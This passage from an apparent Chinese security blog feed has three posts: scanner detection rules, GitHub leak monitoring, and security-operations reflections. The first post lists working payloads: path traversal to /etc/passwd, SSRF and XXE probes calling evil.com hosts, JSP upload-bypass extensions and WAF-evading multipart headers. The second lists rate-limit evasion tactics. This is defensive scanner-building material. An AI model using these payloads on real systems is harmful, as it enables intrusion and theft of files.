&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第1种：
&amp;lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&amp;gt;
　　window.location.href=&quot;login.jsp?backurl=&quot;+window.location.href;
　　&amp;lt;/script&amp;gt;
第2种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　alert(&quot;返回&quot;);
　　window.history.back(-1);
　　&amp;lt;/script&amp;gt;
第3种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　window.navigate(&quot;top.jsp&quot;);
　　&amp;lt;/script&amp;gt;
第4种：
&amp;lt;script language=&quot;JavaScript&quot;&amp;gt;
　　self.location=’top.htm’;
　　&amp;lt;/script&amp;gt;
第5种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　alert(&quot;非法访问！&quot;);
　　top.location=’xx.jsp’;
　　&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再者，我们可以采用更耗资源的暴力做法，直接用headless浏览器去发包，看是否落地域名是否为evil.com。&lt;/p&gt;

&lt;h3 id=&quot;文件读取漏洞lfi和rfi&quot;&gt;文件读取漏洞（LFI和RFI）&lt;/h3&gt;

&lt;p&gt;如果我们需要检测是否存在LFI，替换参数值对为下面的内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;追加：
../../../../../../../../../../../etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
../../../../../../../../../../windows/win.ini

替换：
c:\windows\win.ini
/etc/passwd

匹配关键词：
root
[extensions]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;至于RFI在放在下面一起讲。&lt;/p&gt;

&lt;h3 id=&quot;ssrf漏洞&quot;&gt;SSRF漏洞&lt;/h3&gt;

&lt;p&gt;本漏洞可以可以跟RFI采用类似的检测办法，采用DNS服务器来读取请求。&lt;/p&gt;

&lt;p&gt;这里提一下，如果是内网搭建DNS服务器，我们可以规避不能外联和内网IP限制的问题，能更精确的去进行检测。&lt;/p&gt;

&lt;p&gt;检测关键词如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://vuln.evil.com/index.jsp
http://127.0.0.1/index.jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发包之后，如果存在漏洞，可以去DNS服务接口去读取到匹配vuln.evil.com（内网DNS服务器为evil.com）的结果；
又或是读取到的内容，是否已经匹配到index.jsp里的动态脚本标签。&lt;/p&gt;

&lt;h3 id=&quot;文件下载漏洞&quot;&gt;文件下载漏洞&lt;/h3&gt;

&lt;p&gt;这里用的payload是文件读取漏洞的那套，但是定位的返回关键词不同，我们可以定位response里的header：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type:application/octet-stream
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;xxe漏洞&quot;&gt;XXE漏洞&lt;/h3&gt;

&lt;p&gt;检测xxe漏洞的时候，有两种情况可以尝试fuzz。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;post参数值里含有xml标签时，这种情况可能需要把xxe payload编码发送。&lt;/li&gt;
  &lt;li&gt;直接post了整个xml区块到server端，这种情况可以直接将整块xml区块，替换为xxe payload。&lt;/li&gt;
  &lt;li&gt;整块的xml标签就不写出来了，这里给出附加的payload对,，同样是关键词+DNS服务监听：&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload:
file:///etc/passwd
file:///c:/windows/win.ini
http://xxx.evil.com

匹配关键词：
root
[extensions]
以及dns监听请求evil.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;上传漏洞&quot;&gt;上传漏洞&lt;/h3&gt;

&lt;p&gt;上传漏洞的可操作的地方比较多，目前公布出的payload中，暂时还没有能完全囊括所有hack点，下面我们会以java为例简单讲讲。&lt;/p&gt;

&lt;h4 id=&quot;后缀&quot;&gt;后缀&lt;/h4&gt;
&lt;p&gt;在对java应用后缀绕过的时候，我们可以尝试对下面这些后缀进行fuzz：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jjspsp
jspx
jspa
jtml
jsw
jsv
jspf
jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;冗余绕过&quot;&gt;冗余绕过&lt;/h4&gt;
&lt;p&gt;有些地方，我们进行了hack，但是却不影响数据包发送，比如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Disposition: form-data; name=&quot;myfile&quot;;;; filename=&quot;t3.jsp&quot;

Content-Disposition2: form-data; name=&quot;Upload&quot;; filename=&quot;1.jsp&quot;

合成一行：
Content‐Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.jsp&quot;Content-Type: image/jpeg

Content‐Disposition: form‐data; name=&quot;up_picture&quot;; filename=&quot;xss.js
p&quot;

boundary后面加空格：
Content-Type: multipart/form-data; boundary= —————————47146314211411730218525550

Content-Disposition: form-data; filename=&quot;xx.jsp&quot;; name=&quot;up_picture&quot;

Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.jpg&quot;; filename=&quot;test.jsp&quot;

Content-Disposition: form-data; name=&quot;Fhq&quot;; test=&quot;5W个字符&quot;; filename=&quot;test.jsp&quot;

多个Content-Disposition可以用来绕过waf，一般server默认取的是第一个，但研究范围没有覆盖全java web server，有待验证。

绕过文件类型的验证：
Content-Type: image/jpeg

或者直接删除文件类型的验证：
Content-Type: xxxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;检测上传文件有一个痛点，那就是不好自动化定位上传点。&lt;/p&gt;

&lt;p&gt;对于&lt;strong&gt;有回显的情况&lt;/strong&gt;，暂时有以下的解决办法：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;利用标签正则，手工定位返回的上传点，这种方法对于大规模扫描时不适用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;寻找同一批response包里带有shell后缀的路径，做好web url拼接，暂存后利用shell标识去挨个判断，是否上传成功shell。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于&lt;strong&gt;无回显的情况&lt;/strong&gt;下：&lt;/p&gt;

&lt;p&gt;如果黑盒测试，只能根据常用上传目录去爆破shell文件名，以获取到shell标识为成功。&lt;/p&gt;

&lt;p&gt;否则的话，需要结合白盒定位，手动配置好路径，估算生成的文件名，去进行黑盒探测。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。</summary></entry><entry><title type="html">Git监控小议</title><link href="http://localhost:4000/operation/2019/07/28/sec-git-monitor/" rel="alternate" type="text/html" title="Git监控小议" /><published>2019-07-28T18:00:00+08:00</published><updated>2019-07-28T18:00:00+08:00</updated><id>http://localhost:4000/operation/2019/07/28/sec-git-monitor</id><content type="html" xml:base="http://localhost:4000/operation/2019/07/28/sec-git-monitor/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;那么，对于git方面的监控，我们应该做些什么呢？&lt;/p&gt;

&lt;h3 id=&quot;复合型监控&quot;&gt;复合型监控&lt;/h3&gt;

&lt;h4 id=&quot;敏感关键词监控&quot;&gt;敏感关键词监控&lt;/h4&gt;

&lt;p&gt;对于类github监控，敏感关键词监控是基础，目前主要监控点有以下几种：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;敏感email地址
敏感多级子域名
ssh key
物理机key
云平台key
硬编码的pwd
关键域名+敏感路径+敏感key的拼接
（比如https://xxx/host/{ip}?key={YOUR_API_KEY}）
组织单位标识
关键数据库名、表格名、字段名、连接字符串
vpn配置字符串
smtp配置字符串
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;大部分类github平台，查询应该是需要登录的，这里以github举个例子。&lt;/p&gt;

&lt;p&gt;我们可以用session认证，不过只有前100页的查询限制。&lt;/p&gt;

&lt;p&gt;当然，大家也可以用key+api接口，个人没采用过这个接口，据说默认搜索前5000个项目。&lt;/p&gt;

&lt;p&gt;所以利用好语法是很重要的，我们要精确地对需要监控的关键词，进行综合定位：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;搜索路径中有nsa的代码或者文件中有nsa的代码
nsa in:file,path

搜索用php写的包含userid的代码,文件名为flag，扩展名为txt
userid language:php filename:flag extension:txt

匹配关键字nsa且搜索大小为100字节的xml代码
nsa language:xml size:100

搜索conf目录下包含pass的xml代码
pass path:conf language:xml

除去名为normal_name的repo
-repo:normal_name

搜索star大于20，20&amp;lt;fork&amp;lt;30的项目
stars: &amp;gt;20 fork: 20..30


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;另外，类github平台如果做了查询限制，可以考虑采用以下几点去绕过：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IP池
多账号轮询
UA池
降频处理
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;安全监控&quot;&gt;安全监控&lt;/h4&gt;

&lt;p&gt;在大一点的企业平台，做项目管控时，会接入gitlab或者类github平台的私有项目。&lt;/p&gt;

&lt;p&gt;那么，如果要坚持精简的原则，我们需要完成哪些基础点呢？&lt;/p&gt;

&lt;p&gt;第一，版本监控
每次漏洞大规模爆发时，常常需要去检查下，己方线上环境的组件，是否出于漏洞影响范围之内。&lt;/p&gt;

&lt;p&gt;因此，维护和及时更新IT资产的checklist库，无论是实现的半自动化还是自动化监控，都是有一定积极作用的。&lt;/p&gt;

&lt;p&gt;第二，安全审计
对于项目本身，我们需要做一些代码安全审计和日常扫描。&lt;/p&gt;

&lt;p&gt;一般在代码上线，以及测试分支代码变更时，在条件允许的情况下，都应该触发自动化安全扫描。&lt;/p&gt;

&lt;p&gt;在CI自动化和日常扫描时，一旦检测到问题，需要发送报告到安全运维人员过审，再决定要不要通告开发人员，去进行整改或者代码回退。&lt;/p&gt;

&lt;p&gt;对于代码本身，可提供配置文件或者接口，供第三方软件，进行安全审计，这里不再多提。&lt;/p&gt;

&lt;h4 id=&quot;舆情监控&quot;&gt;舆情监控&lt;/h4&gt;

&lt;p&gt;现如今类github平台因为某些zz原因，成为了某些有心人撰写博客和放新闻的地方。&lt;/p&gt;

&lt;p&gt;笔者当初做舆情监控接口的时候，也添加了对这类平台的接口支持，效果感觉尚可。&lt;/p&gt;

&lt;h3 id=&quot;平台优化tips&quot;&gt;平台优化Tips&lt;/h3&gt;

&lt;h4 id=&quot;关键词定制&quot;&gt;关键词定制&lt;/h4&gt;

&lt;p&gt;如果我们在开发后期，想要去定制一些关键词咋办？&lt;/p&gt;

&lt;p&gt;存在配置文件的情况下，我们可以做关键词命中。&lt;/p&gt;

&lt;p&gt;一旦触发命中我们自己添加的关键词（不一定是标准搜索语法），也会直接通过微信或者邮件，将结果推送到负责人那里。&lt;/p&gt;

&lt;h4 id=&quot;规则可配置&quot;&gt;规则可配置&lt;/h4&gt;

&lt;p&gt;规则配置可以是多样化的，比如类github平台定期巡检，更新触发扫描，主动扫描检查。&lt;/p&gt;

&lt;p&gt;多少时间没响应，会自动再次触发报警推送，多种方式报送警报消息。&lt;/p&gt;

&lt;p&gt;制定repo或者author白名单，避免更多的误报。&lt;/p&gt;

&lt;p&gt;优化读取的内容，指定显示关键词前后文行数。&lt;/p&gt;

&lt;p&gt;设置关键词权重，避免大量冗余数据掩盖了低频高危数据。&lt;/p&gt;

&lt;h4 id=&quot;污点化&quot;&gt;污点化&lt;/h4&gt;

&lt;p&gt;在为了防止企业git项目被泄露到公网，我们在命名规范时，可以尝试制定编码规范，必须带上容易识别的特征，或者带上关键词。&lt;/p&gt;

&lt;p&gt;这样有个好处，在代码泄露时能及时监控到，但防君子不防小人，内部人员可能会做关键词替换。但这种情况，也可以通过一些特殊技巧去提升保密性。&lt;/p&gt;

&lt;p&gt;另外，白帽子提交速度可能比监控响应更快，这就需要考验规范制定者的素质了。&lt;/p&gt;

&lt;h4 id=&quot;参考文章&quot;&gt;参考文章&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/150638.html&quot;&gt;深入分析一款简单的Github信息泄露爬虫&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/xpx1995/article/details/79031397&quot;&gt;Github代码高级搜索小技巧&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/114017.html&quot;&gt;基于Github的源码白盒扫描工具Raptor&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/column/178342.html&quot;&gt;Github信息泄露专项&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。</summary></entry><entry><title type="html">安全运维优化思考</title><link href="http://localhost:4000/operation/2019/07/13/sec-operation/" rel="alternate" type="text/html" title="安全运维优化思考" /><published>2019-07-13T23:40:00+08:00</published><updated>2019-07-13T23:40:00+08:00</updated><id>http://localhost:4000/operation/2019/07/13/sec-operation</id><content type="html" xml:base="http://localhost:4000/operation/2019/07/13/sec-operation/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h4 id=&quot;资产统计与变更&quot;&gt;资产统计与变更&lt;/h4&gt;
&lt;p&gt;这段时间正好碰上了FastJson漏洞爆发。由于笔者所在的甲方，属于有一定规模的互联网公司，所以近期也在连夜配合各业务部门进行漏洞修补。&lt;/p&gt;

&lt;p&gt;虽然公司本身具有强大的统计平台，也具有较为成熟的资产规范，但还是花了大量时间去统计、升级那些受影响的资产。&lt;/p&gt;

&lt;p&gt;举个例子，自家公司的It资产已经接入了自动化运维，采用了基于的ES集群的平台。资产的变更能够及时以*key为基准，计入全局搜索，方便以后搜索和资产统计，以及后续的自动化升级和部署。&lt;/p&gt;

&lt;p&gt;但这种统一部署变更的法子，也存在部分痛点。其中的一个就是，一旦基于ES部署平台和Agent自身存在问题，如果没有得到及时修复的话，其自身不小的体量，可能会影响全局资产的修复进度。&lt;/p&gt;

&lt;p&gt;因此，拥有多份资产升级/变更/检测方案，能做到轻量/重量级方案互相制约，窃以为还是有必要的。&lt;/p&gt;

&lt;p&gt;另外，如果做好了内网Git资产梳理，通过代码扫描定位可能存在的漏洞和服务，也是能辅助统计受影响的资产的。&lt;/p&gt;

&lt;h4 id=&quot;自动化检测认证&quot;&gt;自动化检测认证&lt;/h4&gt;
&lt;p&gt;对于大型甲方，如果安全团队在研究好新出的漏洞Poc，对IT资产安全进行自检的时候，如果按正常流程去做，可能首先应该是先进行任务申请上报，然后向全集团发邮件，最后再进行扫描。&lt;/p&gt;

&lt;p&gt;不过，在碰上比较紧急的漏洞应急时，在跨部门协作的情况下，经常会来不及走完所有流程。&lt;/p&gt;

&lt;p&gt;笔者也曾见过研发、运维等部门，因为突然查到攻击Log，半夜一惊一乍的，去找安全部门验证攻击来源是否属于内部自检。&lt;/p&gt;

&lt;p&gt;那么针对这一点，如何做去做优化呢？&lt;/p&gt;

&lt;p&gt;不少大型企业，有时会采用统一的签名和加密机制，或者直接构建单独的平台，用于保证传输加密的可信认证。&lt;/p&gt;

&lt;p&gt;笔者窃以为，这点是可以借鉴的。如果能做好一定范围内的成本控制，在每次做自动化安全检测的时候，将加密认证信息加入检测数据包头部，以用作内部安全检测的授信，各个BU会更加轻松的识别出真实的攻击事件。&lt;/p&gt;

&lt;h4 id=&quot;敏感数据泄漏控制&quot;&gt;敏感数据泄漏控制&lt;/h4&gt;
&lt;p&gt;防止敏感数据的泄漏，以及进行事后的责任追溯，一直是甲方比较重视的点，据悉大致有这样几种方案：&lt;/p&gt;

&lt;p&gt;1.DLP数据防泄漏&lt;/p&gt;

&lt;p&gt;DLP软件一般是为了定位公司敏感数据外发行为，对于数据流量内容进行监控审计，现在市面上也有了不少成熟的合规产品。&lt;/p&gt;

&lt;p&gt;2.堡垒机&lt;/p&gt;

&lt;p&gt;堡垒机上具有监控，限制数据传输和全程录屏等功能，配合查询系统的水印功能，也能在一定程度上防止数据泄漏，以及对泄漏源进行追溯。&lt;/p&gt;

&lt;p&gt;3.数据脱敏&lt;/p&gt;

&lt;p&gt;在存储和展示敏感数据的时候，本身应该做好脱敏操作，对于数据进行加密存储和非完全展示，防止内鬼和意外泄漏事件发生。&lt;/p&gt;

&lt;p&gt;4.数据监控&lt;/p&gt;

&lt;p&gt;虽然如同Github监控和舆情监控一般的产品，并不能有效抑制数据泄漏。但在防止数据扩散，以及追溯数据泄漏来源的层面来看，还是比较有用的。&lt;/p&gt;

&lt;p&gt;如果能综合利用多类产品，再加上企业本身的安全管理规范，应该是能够在一定程度上保证数据安全的。&lt;/p&gt;

&lt;h4 id=&quot;产品检测流程&quot;&gt;产品检测流程&lt;/h4&gt;
&lt;p&gt;在原来的乙方安全测试岗位，如果需要对产品做安检的时候，随便去咨询个资深的相关产品、售前或者研发，基本上都能问出个所以然来。&lt;/p&gt;

&lt;p&gt;然而到了现在的甲方安全运维岗，可就厉害了。在工作流程细化和文档化以后，需要做安全检测时，得挨个询问多个QA/RD/PM，一点一点把他们的需求和设计方案抠出来，最后还得去找API文档自己做补充和完善，才能进行下一步的操作。&lt;/p&gt;

&lt;p&gt;笔者这两天还去拜访了一家非互联网甲方，跟那边负责安全的Leader朋友聊了下，产品上线合规的紧要性，确实是远优先于安全合规的，当然这个也是不得已而为之。&lt;/p&gt;

&lt;p&gt;总的来说，合规化有益于流程梳理，简化有益于加速产品上线，也算各有各的好处吧。&lt;/p&gt;

&lt;p&gt;当然笔者见识有限，窥一斑而不得见全豹。但总的来说，确实可以根据不同产品的实际情况，去对流程进行一些灵活变通。&lt;/p&gt;

&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;
&lt;p&gt;以上只是简单谈了一些感受，这方面的工作资历尚浅，期待各路读者斧正和指教。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。</summary></entry></feed>